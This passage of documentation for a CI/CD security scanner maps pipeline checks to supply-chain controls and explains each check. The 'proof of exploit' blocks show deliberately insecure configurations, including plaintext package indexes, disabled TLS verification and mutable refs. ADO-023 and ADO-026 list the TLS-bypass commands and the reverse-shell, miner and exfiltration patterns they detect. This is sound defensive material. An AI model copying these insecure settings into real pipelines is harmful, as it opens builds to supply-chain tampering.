| [`NPM-005`](#detail-npm-005) | package.json git dependency uses a mutable ref | <span class="pg-sev pg-sev--high">HIGH</span> | [npm](../providers/npm.md) |  |
| [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`PYPI-001`](#detail-pypi-001) | requirements.txt entry missing an exact version pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [PyPI](../providers/pypi.md) |  |
| [`PYPI-002`](#detail-pypi-002) | requirements.txt missing hash pinning (--require-hashes / --hash=) | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
| [`PYPI-004`](#detail-pypi-004) | requirements.txt VCS dependency uses a mutable ref | <span class="pg-sev pg-sev--high">HIGH</span> | [PyPI](../providers/pypi.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |

### UPD-2: L3: Enable automated OSS updates (Dependabot / Renovate) { #ctrl-upd-2 }

**Evidenced by 6 checks** across 6 providers (Azure DevOps, Bitbucket, CircleCI, GitHub Actions, GitLab CI, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-022`](#detail-ado-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-022`](#detail-bb-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-022`](#detail-cc-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-022`](#detail-gha-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-022`](#detail-gl-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-022`](#detail-jf-022) | Dependency update command bypasses lockfile pins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |

### ENF-1: L2: Enforce security policy of OSS usage (block on violation) { #ctrl-enf-1 }

**Evidenced by 13 checks** across 8 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-004`](#detail-ado-004) | Deployment job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-004`](#detail-bb-004) | Deploy step missing `deployment:` environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-013`](#detail-bk-013) | Deploy step has no branches: filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-008`](#detail-cb-008) | CodeBuild buildspec is inline (not sourced from a protected repo) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-009`](#detail-cc-009) | Deploy job missing manual approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CD-002`](#detail-cd-002) | AllAtOnce deployment config, no canary or rolling strategy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-005`](#detail-cp-005) | Production Deploy stage has no preceding ManualApproval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GHA-014`](#detail-gha-014) | Deploy job missing environment binding | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-005`](#detail-jf-005) | Deploy stage missing manual `input` approval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-024`](#detail-jf-024) | `input` approval step missing submitter restriction | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |

### ENF-2: L2: Break the build when a violation is detected { #ctrl-enf-2 }

**Evidenced by 4 checks** across 2 providers (AWS, GitLab CI).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CP-001`](#detail-cp-001) | No approval action before deploy stages | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CP-005`](#detail-cp-005) | Production Deploy stage has no preceding ManualApproval | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GL-004`](#detail-gl-004) | Deploy job lacks manual approval or environment gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-029`](#detail-gl-029) | Manual deploy job defaults to allow_failure: true | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |

### REB-2: L4: Digitally sign rebuilt / produced OSS artifacts { #ctrl-reb-2 }

**Evidenced by 16 checks** across 11 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-006`](#detail-ado-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-009`](#detail-argo-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CA-001`](#detail-ca-001) | CodeArtifact domain not encrypted with customer KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-006`](#detail-cc-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`ECR-005`](#detail-ecr-005) | Repository encrypted with AES256 rather than KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-009`](#detail-gcb-009) | Artifacts not signed (no cosign / sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-006`](#detail-gha-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-006`](#detail-jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`LMB-001`](#detail-lmb-001) | Lambda function has no code-signing config | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-001`](#detail-sign-001) | No AWS Signer profile defined for Lambda deploys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-002`](#detail-sign-002) | AWS Signer profile is revoked or inactive | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`TKN-009`](#detail-tkn-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### REB-3: L4: Generate SBOMs for artifacts produced { #ctrl-reb-3 }

**Evidenced by 20 checks** across 12 providers (Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Dockerfile, GitHub Actions, GitLab CI, Helm, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-010`](#detail-argo-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-003`](#detail-attest-003) | SBOM contains floating-version dependencies | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-004`](#detail-attest-004) | SLSA provenance ships without a resolved-dependencies set | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-007`](#detail-attest-007) | SBOM packages lack supplier / originator attribution | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-005`](#detail-helm-005) | Chart maintainers field empty or missing chain-of-custody info | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-007`](#detail-helm-007) | Chart.yaml description field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`HELM-010`](#detail-helm-010) | Chart.yaml appVersion field is empty or missing | <span class="pg-sev pg-sev--low">LOW</span> | [Helm](../providers/helm.md) |  |
| [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-001`](#detail-oci-001) | Image manifest is missing OCI provenance annotations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-003`](#detail-oci-003) | Image manifest is missing the ``image.created`` annotation | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-005`](#detail-oci-005) | Image manifest is missing the ``image.licenses`` annotation | <span class="pg-sev pg-sev--low">LOW</span> | [OCI manifest](../providers/oci.md) |  |
| [`TKN-010`](#detail-tkn-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### REB-4: L4: Digitally sign SBOMs produced (attested provenance) { #ctrl-reb-4 }

**Evidenced by 14 checks** across 10 providers (Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ATTEST-001`](#detail-attest-001) | SLSA provenance attests an untrusted builder identity | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-002`](#detail-attest-002) | SLSA provenance source-repo claim is missing or unverifiable | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-005`](#detail-attest-005) | In-toto Statement subject is missing or unpinned | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`ATTEST-006`](#detail-attest-006) | SLSA provenance lacks a meaningful buildType | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-024`](#detail-cc-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`GHA-024`](#detail-gha-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

### `ADO-001`: Task reference not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-001 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Floating-major task references (`@1`, `@2`) can roll forward silently when the task publisher ships a breaking or malicious update. Pass when every `task:` reference carries a two- or three-segment semver.

**Recommendation.** Reference tasks by a full semver (`DownloadSecureFile@1.2.3`) or extension-published-version. Track task updates explicitly via Azure DevOps extension settings rather than letting `@1` drift.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``AzureCLI@2`` resolves to whatever
# Microsoft ships as version 2 at job-start time. A
# Microsoft-pushed update silently changes the task body;
# more importantly, custom Marketplace tasks at floating
# major version are repointable by their publisher.
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: prod-sub
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: az deploy ...

# Safe: pin to a specific patch version (``AzureCLI@2.245.0``)
# or use ``AzureCLI@2.x`` only for first-party Microsoft
# tasks where Marketplace publish controls are stronger.
# Renovate's azure-pipelines updater bumps these.
steps:
  - task: AzureCLI@2.245.0
    inputs:
      azureSubscription: prod-sub
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: az deploy ...
```

**Source:** [`ADO-001`](../providers/azure.md#ado-001) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }

**Evidences:** [`ENF-1`](#ctrl-enf-1) L2: Enforce security policy of OSS usage (block on violation).

**How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.

**Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.

**Known false positives.**

- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.

**Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-005`: Container image not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-005 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.

**Proof of exploit.**

```
# Vulnerable: a container resource pinned to a mutable
# tag. The publisher (or anyone with publish access)
# repoints the tag on the next refresh; every pipeline
# run pulls the swap silently.
resources:
  containers:
    - container: build-env
      image: myorg/build-env:latest
jobs:
  - job: build
    container: build-env
    steps:
      - script: make build

# Safe: pin to the content-addressable digest. Renovate /
# Dependabot's docker ecosystem bump the digest in PRs.
resources:
  containers:
    - container: build-env
      image: myorg/build-env@sha256:abc123...
jobs:
  - job: build
    container: build-env
    steps:
      - script: make build
```

**Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-006 }

**Evidences:** [`REB-2`](#ctrl-reb-2) L4: Digitally sign rebuilt / produced OSS artifacts.

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears anywhere in the pipeline text.

**Recommendation.** Add a task that runs `cosign sign` or `notation sign`, Azure Pipelines' workload identity federation enables keyless signing. Publish the signature to the artifact feed and verify it at deploy time.

**Source:** [`ADO-006`](../providers/azure.md#ado-006) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-007 }

**Evidences:** [`REB-3`](#ctrl-reb-3) L4: Generate SBOMs for artifacts produced.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact.

**Recommendation.** Add an SBOM step, `microsoft/sbom-tool`, `syft . -o cyclonedx-json`, or `anchore/sbom-action`. Publish the SBOM as a pipeline artifact so downstream consumers can ingest it.

**Source:** [`ADO-007`](../providers/azure.md#ado-007) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-009`: Container image pinned by tag rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-ado-009 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** ADO-005 fails floating tags at HIGH; ADO-009 is the stricter tier. Even immutable-looking version tags can be repointed by registry operators.

**Recommendation.** Resolve each image to its current digest and replace the tag with `@sha256:<digest>`. Schedule regular digest bumps via Renovate or a scheduled pipeline.

**Source:** [`ADO-009`](../providers/azure.md#ado-009) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-018 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: pip resolves and downloads packages over
# plaintext HTTP. ``--trusted-host`` silences hash
# verification for the named host, so an attacker on the
# network path can swap wheels in flight.
steps:
  - bash: |
      pip install \
        --index-url http://internal-pypi.example.com/simple \
        --trusted-host internal-pypi.example.com \
        -r requirements.txt

# Safe: HTTPS with the index's certificate validated.
# Internal CA installed in the agent's trust store.
steps:
  - bash: |
      pip install \
        --index-url https://internal-pypi.example.com/simple \
        --require-hashes -r requirements.txt
```

**Source:** [`ADO-018`](../providers/azure.md#ado-018) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-020`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-020 }

**Evidences:** [`SCA-1`](#ctrl-sca-1) L1: Scan OSS for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`ADO-020`](../providers/azure.md#ado-020) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-021 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ADO-021`](../providers/azure.md#ado-021) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-022 }

**Evidences:** [`UPD-2`](#ctrl-upd-2) L3: Enable automated OSS updates (Dependabot / Renovate).

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`ADO-022`](../providers/azure.md#ado-022) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-ado-023 }

**Evidences:** [`ING-1`](#ctrl-ing-1) L1: Use package managers trusted by your organization.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Proof of exploit.**

```
# Vulnerable: ``npm config set strict-ssl false`` disables
# certificate verification for every subsequent npm call.
# A network attacker MITMs the registry and ships
# substituted tarballs that npm installs unverified.
steps:
  - bash: |
      npm config set strict-ssl false
      npm install

# Safe: install the missing CA into the agent's trust
# store and keep strict-ssl on.
steps:
  - bash: |
      sudo cp ./ci/internal-ca.crt /usr/local/share/ca-certificates/
      sudo update-ca-certificates
      npm install
```

**Source:** [`ADO-023`](../providers/azure.md#ado-023) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-024 }

**Evidences:** [`REB-4`](#ctrl-reb-4) L4: Digitally sign SBOMs produced (attested provenance).

**How this is detected.** On Azure Pipelines the common pattern is a ``Bash@3`` task invoking ``cosign attest --yes --predicate=provenance.json $(image)``. The native Microsoft SBOM tool emits ``_manifest/spdx_2.2/manifest.spdx.json`` for SBOM but does not produce provenance on its own.

**Recommendation.** Add a task that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or Microsoft's ``sbom-tool`` in attestation mode. ADO-006 covers signing; this rule covers the in-toto statement SLSA Build L3 additionally requires.

**Source:** [`ADO-024`](../providers/azure.md#ado-024) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-025`: Cross-repo template not pinned to commit SHA <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-025 }

**Evidences:** [`UPD-1`](#ctrl-upd-1) L1: Update vulnerable OSS manually (pin + track versions).

**How this is detected.** Azure Pipelines resolves ``template: build.yml@tools`` against the ``tools`` repo resource's ``ref:`` field. When that ref is ``refs/heads/main`` (or missing, which defaults to the pipeline's default branch), a push to the callee repo changes what your pipeline runs on the next invocation.

**Recommendation.** On every ``resources.repositories`` entry referenced from a ``template: ...@repo-alias`` directive, set ``ref: refs/tags/<sha>`` or the bare 40-char commit SHA, never a branch or floating tag. A moved branch/tag swaps the template body without changing your pipeline file.

**Proof of exploit.**

```
# Vulnerable: ``ref: refs/heads/main`` on a cross-repo
# template is mutable. Whoever can push to ``main`` on
# ``ci-templates`` ships code into every consumer's
# pipeline on the next run.
resources:
  repositories:
    - repository: templates
      type: git
      name: myorg/ci-templates
      ref: refs/heads/main
steps:
  - template: build.yml@templates

# Safe: pin to a tag (immutable in Azure Repos when
# branch policies enforce tag-protect) or a 40-char
# commit SHA. Renovate's azure-pipelines updater bumps
# these in reviewable PRs.
resources:
  repositories:
    - repository: templates
      type: git
      name: myorg/ci-templates
      ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
steps:
  - template: build.yml@templates
```

**Source:** [`ADO-025`](../providers/azure.md#ado-025) in the [Azure DevOps provider](../providers/azure.md).

### `ADO-026`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-026 }

**Evidences:** [`SCA-3`](#ctrl-sca-3) L2: Scan OSS for malware.

**How this is detected.** ADO pipelines can run arbitrary shell via ``bash`` / ``script`` / ``powershell`` tasks. This rule scans every string value for known-bad patterns (reverse shells, base64-decoded execution, miner binaries, exfil channels). Orthogonal to ADO-016/ADO-017/ADO-023.

**Recommendation.** Treat as a potential compromise. Identify the PR/branch that added the matching task(s), rotate any Service Connections the pipeline can reach, and audit Pipeline run logs for outbound traffic to the matched hosts.

